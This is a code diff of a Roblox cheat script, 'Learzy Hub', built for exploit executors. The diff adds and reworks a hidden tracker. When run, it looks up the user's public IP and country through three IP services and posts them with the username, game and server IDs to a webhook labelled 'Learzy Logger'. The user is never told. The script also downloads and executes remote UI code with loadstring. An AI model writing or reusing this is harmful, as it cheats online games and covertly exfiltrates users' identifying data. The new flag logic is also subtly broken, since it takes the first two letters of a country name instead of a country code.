@@ -3,12 +3,47 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local LocalPlayer = Players.LocalPlayer
-local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request)
+local requestFunction = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
 
--- === Executor Name sebelum UI ===
-local executorName = identifyexecutor and identifyexecutor() or "Unknown Executor"
+-- === Helper: Get IP with fallback and country ===
+local function fetchJSON(url)
+    local response = requestFunction({ Url = url, Method = "GET" })
+    if response and response.Body then
+        local ok, data = pcall(HttpService.JSONDecode, HttpService, response.Body)
+        if ok and data then return data end
+    end
+    return nil
+end
+
+local function getAccurateIP()
+    local sources = {
+        {url = "http://httpbin.org/ip", key = "origin"},
+        {url = "http://ip-api.com/json", key = "query"},
+        {url = "http://ipinfo.io/json", key = "ip"}
+    }
+
+    for _, src in ipairs(sources) do
+        local data = fetchJSON(src.url)
+        if data and data[src.key] then
+            local ip = data[src.key]
+            local country = data.country or data.country_name or "Unknown"
+            return ip, country
+        end
+    end
+
+    return "Unknown", "Unknown"
+end
+
+-- === Country to Flag ===
+local function countryFlagEmoji(code)
+    if not code or #code ~= 2 then return "" end
+    local OFFSET = 127397
+    local a, b = code:sub(1,1):byte(), code:sub(2,2):byte()
+    return utf8.char(OFFSET + a, OFFSET + b)
+end
 
 -- === Load Rayfield UI ===
+local executorName = identifyexecutor and identifyexecutor() or "Unknown Executor"
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local Window = Rayfield:CreateWindow({
     Name = "Learzy Hub | " .. executorName,
@@ -51,55 +86,18 @@ local function showBlacklistScreen()
     label.Parent = screenGui
 end
 
-local function getCountryFromIP(ip)
-    local country, code = "Unknown", ""
-    if requestFunction then
-        local resp = requestFunction({
-            Url = "http://ip-api.com/json/" .. ip .. "?fields=status,country,countryCode",
-            Method = "GET"
-        })
-        if resp and resp.Body then
-            local ok, d = pcall(HttpService.JSONDecode, HttpService, resp.Body)
-            if ok and d and d.status == "success" then
-                country, code = d.country, d.countryCode
-            end
-        end
-    end
-    return country, code
-end
-
-local function countryFlagEmoji(code)
-    if not code or #code ~= 2 then return "" end
-    local OFFSET = 127397
-    local a, b = code:sub(1,1):byte(), code:sub(2,2):byte()
-    return utf8.char(OFFSET + a, OFFSET + b)
-end
-
-local function getClientInfo()
-    local ip = "Unknown"
-    if requestFunction then
-        local resp = requestFunction({ Url = "https://httpbin.org/ip", Method = "GET" })
-        if resp and resp.Body then
-            local ok, d = pcall(HttpService.JSONDecode, HttpService, resp.Body)
-            if ok and d and d.origin then ip = d.origin end
-        end
-    end
-    return ip, executorName
-end
-
-local function sendWebhook(ip, executor, isBlacklisted)
+-- === Send Webhook ===
+local function sendWebhook(ip, country, executor, isBlacklisted)
     local username = LocalPlayer and LocalPlayer.Name or "Unknown"
-    local country, code = getCountryFromIP(ip)
-    local flag = countryFlagEmoji(code)
+    local flag = countryFlagEmoji((country ~= "Unknown" and country:sub(1,2):upper()) or "")
+    local gameName, gameId = "Unknown Game", tostring(game.PlaceId)
 
-    local gameName = "Unknown Game"
-    local gameId = tostring(game.PlaceId)
     local ok, info = pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
     if ok and info then gameName = info.Name or gameName; gameId = info.AssetId or gameId end
 
     local payload = {
         content = "",
-        embeds = {{
+        embeds = { {
             title = "Script Execution Detected",
             color = isBlacklisted and 14423100 or 65280,
             fields = {
@@ -108,13 +106,13 @@ local function sendWebhook(ip, executor, isBlacklisted)
                 {name = "Country", value = country .. " " .. flag, inline = true},
                 {name = "Executor", value = executor, inline = false},
                 {name = "Game Name", value = gameName, inline = false},
-                {name = "Game ID", value = tostring(gameId), inline = true},
+                {name = "Game ID", value = gameId, inline = true},
                 {name = "Job ID", value = tostring(game.JobId), inline = true},
                 {name = "Blacklisted", value = isBlacklisted and "Yes" or "No", inline = true}
             },
             footer = {text = "Learzy Logger"},
             timestamp = DateTime.now():ToIsoDate()
-        }}
+        } }
     }
 
     requestFunction({
@@ -125,9 +123,11 @@ local function sendWebhook(ip, executor, isBlacklisted)
     })
 end
 
+-- === Main Logic ===
 task.spawn(function()
-    local ip, executor = getClientInfo()
+    local ip, country = getAccurateIP()
     local username = LocalPlayer and LocalPlayer.Name or "Unknown"
+    local executor = executorName
 
     local function isTableEmpty(tbl)
         for _ in pairs(tbl) do return false end
@@ -136,7 +136,6 @@ task.spawn(function()
 
     local isUsernameBlacklisted = BlacklistedUsernames[username] or false
     local isIPBlacklisted = BlacklistedIPs[ip] or false
-
     local isBlacklistEnabled = not isTableEmpty(BlacklistedUsernames) or not isTableEmpty(BlacklistedIPs)
     local isBlacklisted = false
 
@@ -146,13 +145,10 @@ task.spawn(function()
         end
     end
 
-    sendWebhook(ip, executor, isBlacklisted)
+    sendWebhook(ip, country, executor, isBlacklisted)
+    if isBlacklisted then showBlacklistScreen() return end
 
-    if isBlacklisted then
-        showBlacklistScreen()
-        return
-    end
-
+    -- Tabs
     local tabPlayer = Window:CreateTab("Player", 4483362458)
     local tabVisual = Window:CreateTab("Visual", 4483362458)
     local tabCombat = Window:CreateTab("Combat", 4483362458)
